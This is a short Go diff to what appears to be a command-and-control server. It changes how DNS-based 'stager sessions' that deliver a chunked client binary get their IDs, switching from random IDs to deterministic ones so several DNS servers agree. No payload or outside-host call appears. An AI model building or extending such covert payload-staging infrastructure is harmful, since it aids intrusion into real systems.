@@ -12,7 +12,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"math/rand"
 	"net"
 	"net/http"
 	"os"
@@ -2615,8 +2614,9 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 	}
 	fmt.Printf("[API] Loaded client binary: %s (%d chunks, checksum: %s)\n", clientBinaryID, totalChunks, checksumDisplay)
 
-	// Create stager session (4-char random ID to keep DNS packets under 512 bytes)
-	sessionID := fmt.Sprintf("stg_%04x", rand.Intn(65536))
+	// Create stager session with DETERMINISTIC ID based on stager IP + binary ID
+	// This ensures Shadow Mesh works correctly - all DNS servers generate the same session ID
+	sessionID := generateDeterministicStagerSessionID(req.StagerIP, clientBinaryID)
 
 	err = api.db.CreateStagerSession(
 		sessionID,
